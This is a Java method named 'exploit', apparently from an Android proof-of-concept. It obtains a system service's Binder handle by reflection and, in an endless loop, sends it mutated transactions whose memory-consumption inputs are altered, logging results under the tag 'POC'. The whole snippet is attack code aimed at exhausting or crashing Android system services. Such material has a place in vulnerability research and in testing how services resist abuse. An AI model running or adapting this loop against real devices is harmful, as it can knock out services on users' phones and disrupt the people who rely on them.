public static void exploit(FuzzingInfo fuzzingInfo, List<TestCase> testCases) throws Exception {
  Class ServiceManager = Class.forName("android.os.ServiceManager");
  Method getService = ServiceManager.getDeclaredMethod("getService", String.class);
  IBinder iBinder = (IBinder) getService.invoke(null, fuzzingInfo.serviceName);
  final String interfaceName = iBinder.getInterfaceDescriptor();
  while (true) {
    for (TestCase testCase : testCases) {
      Parcel in = Parcel.obtain();
      Parcel out = Parcel.obtain();
      in.writeInterfaceToken(interfaceName);
      // Only change content of memory consumption related inputs, and don't change their sizes.
      TestCase subTestCase = testCase.mutate(fuzzingInfo);
      subTestCase.writeToParcel(in);
      try {
        Boolean onTransactRes = iBinder.transact(fuzzingInfo.transactionCode, in, out, 0);
        if (!onTransactRes) {
          Log.d("POC", "Invalid transact function code.");
          return;
        }
        out.readException();
      } catch (Exception e) {
        Log.d("POC", "exception: " + e);
      } finally {
        in.recycle();
        out.recycle();
      }
    }
  }
}